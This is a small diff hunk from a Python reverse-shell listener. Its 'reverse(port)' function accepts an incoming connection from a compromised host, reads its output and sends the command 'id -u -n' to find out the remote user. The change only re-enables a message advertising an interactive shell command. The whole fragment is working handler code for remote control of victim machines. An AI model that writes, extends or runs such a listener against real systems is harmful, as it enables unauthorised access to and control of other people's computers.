@@ -24,7 +24,7 @@ def reverse(port):
         a,b=reverseshell.accept()
         print("[+] SUCCESSFUL CONNECTION")
         print(a.recv(1024).decode('utf-8'))
-        #print('[!] Interactive shell to check >> use command shell_check')
+        print('[!] Interactive shell to check >> use command shell_check')
         a.settimeout(2)
         host=str.encode('id -u -n')
         a.send(host)
